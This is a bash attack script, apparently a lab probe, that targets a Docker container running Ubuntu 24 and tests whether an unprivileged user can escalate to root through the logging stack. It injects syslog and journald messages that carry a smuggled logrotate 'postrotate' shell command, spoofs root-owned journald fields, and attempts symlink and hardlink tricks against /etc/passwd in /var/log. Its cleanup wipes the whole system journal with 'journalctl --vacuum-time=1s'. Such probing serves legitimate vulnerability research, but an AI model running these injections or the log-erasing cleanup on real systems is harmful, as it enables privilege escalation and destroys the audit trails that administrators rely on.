#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-ubuntu24-server-lpe-target}"
TAG="${TAG:-RSJL_$(date -u +%Y%m%d%H%M%S)_$$}"

docker exec -i -e TAG="$TAG" "$TARGET" bash -s <<'TARGET_SCRIPT'
set -u

log() {
  printf '\n## %s\n' "$*"
}

run_attacker() {
  runuser -u attacker -- env TAG="$TAG" ROOT_PROOF="$ROOT_PROOF" bash -lc "$1"
}

TAG="${TAG:?missing TAG}"
ROOT_PROOF="/root/${TAG}_root_proof"
BACKUP_DIR="/tmp/${TAG}_log_backup"
CLEANED=0

backup_log() {
  local path="$1"
  [ -e "$path" ] || return 0
  mkdir -p "$BACKUP_DIR$(dirname "$path")"
  cp -a "$path" "$BACKUP_DIR$path"
  printf '%s\n' "$path" >> "$BACKUP_DIR/manifest"
}

restore_text_logs() {
  [ -f "$BACKUP_DIR/manifest" ] || return 0
  while IFS= read -r path; do
    [ -f "$BACKUP_DIR$path" ] || continue
    if [ -e "$path" ]; then
      cat "$BACKUP_DIR$path" > "$path"
      chown --reference="$BACKUP_DIR$path" "$path" 2>/dev/null || true
      chmod --reference="$BACKUP_DIR$path" "$path" 2>/dev/null || true
    else
      mkdir -p "$(dirname "$path")"
      cp -a "$BACKUP_DIR$path" "$path"
    fi
  done < "$BACKUP_DIR/manifest"
}

cleanup() {
  [ "$CLEANED" = 0 ] || return 0
  CLEANED=1
  restore_text_logs
  rm -f "$ROOT_PROOF" \
        "/tmp/${TAG}"* \
        "/var/tmp/${TAG}"* \
        "/var/log/${TAG}"* \
        "/run/log/${TAG}"* 2>/dev/null || true
  rm -rf "$BACKUP_DIR" 2>/dev/null || true
  systemctl kill -s HUP rsyslog.service >/dev/null 2>&1 || true
  journalctl --rotate >/dev/null 2>&1 || true
  sleep 2
  journalctl --vacuum-time=1s >/dev/null 2>&1 || true
}

trap cleanup EXIT

log "baseline"
printf 'tag=%s\n' "$TAG"
cat /etc/os-release | sed -n 's/^PRETTY_NAME=/PRETTY_NAME=/p'
id attacker
printf 'attacker_groups='
id -nG attacker
dpkg-query -W -f='${binary:Package}\t${Version}\n' rsyslog systemd logrotate 2>/dev/null
systemctl is-system-running || true
systemctl is-active rsyslog.service systemd-journald.service || true
systemctl list-sockets --all --no-pager | egrep 'syslog|journal|dev-log' || true
ls -ld /var/log /run/log /run/log/journal 2>/dev/null || true
ls -l /dev/log /run/systemd/journal/dev-log /run/systemd/journal/socket /run/systemd/journal/stdout /run/systemd/journal/syslog 2>/dev/null || true
sysctl fs.protected_symlinks fs.protected_hardlinks fs.protected_regular fs.protected_fifos 2>/dev/null || true

for path in /var/log/syslog /var/log/auth.log /var/log/user.log /var/log/mail.log /var/log/mail.err /var/log/ufw.log; do
  backup_log "$path"
done
rm -f "$ROOT_PROOF"

log "default config trust boundaries"
sed -n '1,120p' /etc/rsyslog.conf
sed -n '1,120p' /etc/rsyslog.d/50-default.conf
[ -f /etc/rsyslog.d/20-ufw.conf ] && sed -n '1,80p' /etc/rsyslog.d/20-ufw.conf
sed -n '1,120p' /etc/logrotate.d/rsyslog
sed -n '1,80p' /usr/lib/rsyslog/rsyslog-rotate
ls -l /etc/rsyslog.conf /etc/rsyslog.d /etc/rsyslog.d/50-default.conf /etc/logrotate.d /etc/logrotate.d/rsyslog /usr/lib/rsyslog/rsyslog-rotate

log "uid1001 syslog socket injection with newlines and control bytes"
run_attacker 'python3 - <<PY
import os, socket, time
tag = os.environ["TAG"]
root_proof = os.environ["ROOT_PROOF"]
payload = (
    f"<85>May 16 12:00:00 fakehost sudo[1]: {tag}_DEVLOG line1\n"
    f"postrotate\n\t/bin/sh -c '\''id > {root_proof}'\''\nendscript "
    "ESC=\x1b[31mRED\x1b[0m NUL=\x00 END"
).encode("utf-8", "surrogateescape")
for path in ("/dev/log", "/run/systemd/journal/syslog"):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    s.sendto(payload.replace(b"_DEVLOG", f"_{path.rsplit(chr(47), 1)[-1]}".encode()), path)
    s.close()
time.sleep(0.2)
PY'

log "uid1001 journald native trusted-field spoof attempt"
run_attacker 'printf "MESSAGE=%s\nPRIORITY=5\nSYSLOG_FACILITY=10\nSYSLOG_IDENTIFIER=sudo\n_PID=1\n_UID=0\n_GID=0\nOBJECT_PID=1\n" "${TAG}_JOURNALD_NATIVE id > ${ROOT_PROOF}" | logger --journald'

log "uid1001 journald stdout stream newline split"
run_attacker 'printf "%s\n%s\n" "${TAG}_STDOUT_STREAM first line" "May 16 fakehost root[1]: /bin/sh -c id > ${ROOT_PROOF}" | systemd-cat -t roothelper -p warning'

sleep 1

log "materialized text log evidence"
for path in /var/log/auth.log /var/log/syslog /var/log/user.log /var/log/mail.log /var/log/mail.err /var/log/ufw.log; do
  [ -e "$path" ] || continue
  printf '\n-- %s --\n' "$path"
  grep -a "$TAG" "$path" | tail -n 20 || true
  stat -c '%A %U:%G %n' "$path" || true
done

log "journal trusted fields for probe entries"
journalctl --no-pager -o export -g "$TAG" | \
  awk '/^(MESSAGE|_UID|_GID|_PID|SYSLOG_IDENTIFIER|SYSLOG_FACILITY|PRIORITY|OBJECT_PID|_TRANSPORT)=/ { print } /^$/ { print "" }' | \
  sed -n '1,160p' || true

log "uid1001 filesystem precondition checks"
run_attacker 'set +e
for cmd in \
  "touch /var/log/${TAG}_create" \
  "ln /etc/passwd /var/log/${TAG}_hardlink" \
  "ln -s /etc/passwd /var/log/${TAG}_symlink" \
  "truncate -s 0 /var/log/syslog" \
  "touch /run/log/${TAG}_runlog_create" \
  "ln -s /etc/passwd /run/log/${TAG}_runlog_symlink" \
  "touch /run/log/journal/${TAG}_journal_create"; do
    printf "$ %s\n" "$cmd"
    bash -lc "$cmd" 2>&1
    printf "rc=%s\n" "$?"
done'
find /var/log /run/log -maxdepth 2 \( -name "${TAG}*" -o -lname "*${TAG}*" \) -ls 2>/dev/null || true

log "attacker-trigger attempts for root maintenance"
run_attacker 'set +e
systemctl start logrotate.service 2>&1; printf "attacker_start_logrotate_rc=%s\n" "$?"
systemctl kill -s HUP rsyslog.service 2>&1; printf "attacker_hup_rsyslog_rc=%s\n" "$?"'

log "stock logrotate debug path for create compress postrotate"
logrotate -d -f /etc/logrotate.conf 2>&1 | \
  egrep -a 'rotating pattern: /var/log/(syslog|mail\.log|kern\.log|auth\.log|user\.log|cron\.log)|renaming /var/log|creating new /var/log|compressing log|running postrotate|rsyslog-rotate|switching euid|switching egid' | \
  sed -n '1,220p' || true

log "root proof check"
if [ -s "$ROOT_PROOF" ]; then
  printf 'ROOT_PROOF=YES\n'
  sed -n '1,20p' "$ROOT_PROOF"
else
  printf 'ROOT_PROOF=NO\n'
fi

log "cleanup"
cleanup
printf 'probe_owned_files_after_cleanup=\n'
find /tmp /var/tmp /var/log /run/log -maxdepth 2 \( -name "${TAG}*" -o -lname "*${TAG}*" \) -ls 2>/dev/null || true
printf 'journal_entries_after_cleanup=%s\n' "$(journalctl --no-pager -g "$TAG" 2>/dev/null | grep -c "$TAG" || true)"
printf 'text_log_entries_after_cleanup=%s\n' "$(grep -Rsa "$TAG" /var/log/*.log /var/log/mail.* 2>/dev/null | wc -l || true)"

log "post-clean system health"
systemctl is-system-running || true
systemctl is-active rsyslog.service systemd-journald.service || true
systemctl --failed --no-pager || true
TARGET_SCRIPT
